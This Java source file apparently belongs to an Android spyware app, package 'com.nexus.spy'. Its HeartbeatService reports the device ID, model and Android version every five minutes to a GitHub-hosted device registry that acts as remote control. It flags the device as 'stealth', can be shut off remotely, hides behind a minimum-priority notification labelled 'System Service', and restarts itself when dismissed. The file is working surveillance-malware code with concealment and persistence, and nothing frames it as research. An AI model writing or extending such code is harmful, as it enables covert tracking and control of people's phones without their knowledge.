package com.nexus.spy;
import android.app.*;
import android.content.Intent;
import android.os.*;
import android.provider.Settings;
import org.json.*;
public class HeartbeatService extends Service {
    Handler h = new Handler(Looper.getMainLooper());
    Runnable r = new Runnable() {
        @Override public void run() {
            try {
                String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                JSONObject devices = GithubApi.read("data/devices.json");
                if (devices == null) devices = new JSONObject();
                JSONObject dev = devices.optJSONObject(id);
                if (dev == null) dev = new JSONObject();
                if (!dev.optBoolean("active", true)) {
                    stopSelf(); stopService(new Intent(HeartbeatService.this, CommandService.class)); return;
                }
                dev.put("model", android.os.Build.MODEL);
                dev.put("android", android.os.Build.VERSION.RELEASE);
                dev.put("lastSeen", System.currentTimeMillis());
                dev.put("stealth", true); dev.put("active", true);
                if (!dev.has("name")) dev.put("name", android.os.Build.MODEL + " (" + id.substring(0,6) + ")");
                devices.put(id, dev);
                GithubApi.write("data/devices.json", devices.toString(), "heartbeat " + id + " " + System.currentTimeMillis());
            } catch (Exception e) {}
            h.postDelayed(this, 300000);
        }
    };
    @Override public int onStartCommand(Intent i, int f, int s) {
        NotificationChannel ch = new NotificationChannel("sys_svc","System Service", NotificationManager.IMPORTANCE_MIN);
        ch.setShowBadge(false); ch.enableLights(false); ch.enableVibration(false);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        startForeground(1, new Notification.Builder(this,"sys_svc")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(Notification.PRIORITY_MIN).build());
        h.post(r);
        return START_STICKY;
    }
    @Override public void onTaskRemoved(Intent rootIntent) {
        Intent restart = new Intent(getApplicationContext(), RestartService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(restart); else startService(restart);
        super.onTaskRemoved(rootIntent);
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
